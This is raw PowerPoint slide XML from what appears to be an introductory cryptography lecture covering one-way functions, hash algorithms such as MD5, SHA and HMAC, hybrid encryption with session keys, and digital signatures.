              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Dr. Taher el gamal</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One-Way Functions</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="908"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Mathematical operation that easily produces output values for each possible combination of inputs but makes it impossible to retrieve the input values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Never been proven that any specific known function is truly one way.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Basis for Public key cryptosystems</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="24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Functions cryptographers suspect to be one way </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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It’s theoretically possible that they might be broken by future cryptanalysts</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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Examples: multiplication vs factorization</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9"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Hashing Algorithms</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="910"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Message digests are summaries of a message’s content</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Impossible, to derive a message from an ideal hash function</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Very unlikely that two messages will produce the same hash value.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Used to ensure </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Integrity</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> of messages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Common Hash Algorithms</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="320"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Message Digest 5 (MD5)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="320"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Secure Hash Algorithm (SHA)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="320"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Hashed Message Authentication Code (HMAC)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="911" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6842880" y="3896640"/>
            <a:ext cx="2037960" cy="2961000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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2"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Hashing Algorithms</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="913"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Variable length of input, and fixed length of output.</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Collision free.</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Avalanche effect.</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Irreversible.</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4"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Applications of Cryptographic Hashes</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="915"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Password veriﬁcation</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Message authenticity</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File integrity</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Hybrid Encryption Methods</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="917" name="Group 6"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2743200" y="1600200"/>
            <a:ext cx="5028840" cy="2666520"/>
            <a:chOff x="2743200" y="1600200"/>
            <a:chExt cx="5028840" cy="2666520"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="918" name="Round Same Side Corner Rectangle 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2743200" y="1600200"/>
              <a:ext cx="5028840" cy="2666520"/>
            </a:xfrm>
            <a:prstGeom prst="round2SameRect">
              <a:avLst>
                <a:gd name="adj1" fmla="val 16667"/>
                <a:gd name="adj2" fmla="val 0"/>
              </a:avLst>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="38100">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
          <p:txBody>
            <a:bodyPr numCol="1" spcCol="0" lIns="82080" rIns="82080" tIns="41040" bIns="41040" anchor="t">
              <a:noAutofit/>
            </a:bodyPr>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                </a:rPr>
                <a:t>Message and key will be sent to the receiver</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="919" name="Rectangle 4"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5303880" y="2215800"/>
              <a:ext cx="1444680" cy="1777680"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="38100">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
          <p:txBody>
            <a:bodyPr numCol="1" spcCol="0" lIns="82080" rIns="82080" tIns="41040" bIns="41040" anchor="t">
              <a:noAutofit/>
            </a:bodyPr>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                </a:rPr>
                <a:t>Message</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                </a:rPr>
                <a:t>Encrypted with </a:t>
              </a:r>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="7030a0"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                </a:rPr>
                <a:t>session key</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="920" name="Rectangle 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3205800" y="2215800"/>
              <a:ext cx="1796760" cy="1589760"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="38100">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
          <p:txBody>
            <a:bodyPr numCol="1" spcCol="0" lIns="82080" rIns="82080" tIns="41040" bIns="41040" anchor="t">
              <a:noAutofit/>
            </a:bodyPr>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="7030a0"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                </a:rPr>
                <a:t>Session Key</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                </a:rPr>
                <a:t>Symmetric key encrypted with asymmetric key</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="921" name="TextBox 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="380880" y="4572000"/>
            <a:ext cx="8305560" cy="206388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90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="ff0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="ff0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Symmetric algorithms: </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>- Creates sessions keys which encrypts bulk data (the message)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="ff0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="ff0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Asymmetric algorithms:</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>- Use public and private keys for automated distribution of session keys</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="922" name="Picture 14" descr="Key"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3796200" y="2448360"/>
            <a:ext cx="470520" cy="571320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
          <a:scene3d>
            <a:camera prst="orthographicFront">
              <a:rot lat="0" lon="0" rev="5400000"/>
            </a:camera>
            <a:lightRig dir="t" rig="threePt"/>
          </a:scene3d>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="923" name="Picture 25" descr="clear_message"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5728320" y="2514600"/>
            <a:ext cx="590040" cy="713880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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4" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1197000"/>
            <a:ext cx="7772040" cy="1469520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Digital Signatures</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="925" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="3581280"/>
            <a:ext cx="6400440" cy="1752120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:buNone/>
            </a:pP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Security Services- Digital Signatures</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="927" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="380952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ff0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Authenticates</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> a source, proving a certain party has seen, and has signed, the data in question</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Signing party </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="ff0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>cannot repudiate</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> that it signed the data</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Guarantees that the data has not changed from the time it was signed</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="928" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4653000" y="5275080"/>
            <a:ext cx="172332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90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Authenticity </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="929" name="Rectangle 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7731000" y="5412960"/>
            <a:ext cx="125568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90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Integrity </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="930" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5889600" y="5794200"/>
            <a:ext cx="2131920" cy="363600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Nonrepudiation </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="931" name="Picture 26" descr="MCj04247920000[1]"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4570560" y="1766880"/>
            <a:ext cx="2704680" cy="2945880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="932" name="WordArt 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6094440" y="3443400"/>
            <a:ext cx="990360" cy="761760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t" anchorCtr="1">
            <a:prstTxWarp prst="textPlain">
              <a:avLst>
                <a:gd name="adj" fmla="val 50000"/>
              </a:avLst>
            </a:prstTxWarp>
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:ln w="0">
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Brush Script MT"/>
              </a:rPr>
              <a:t>Digital </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
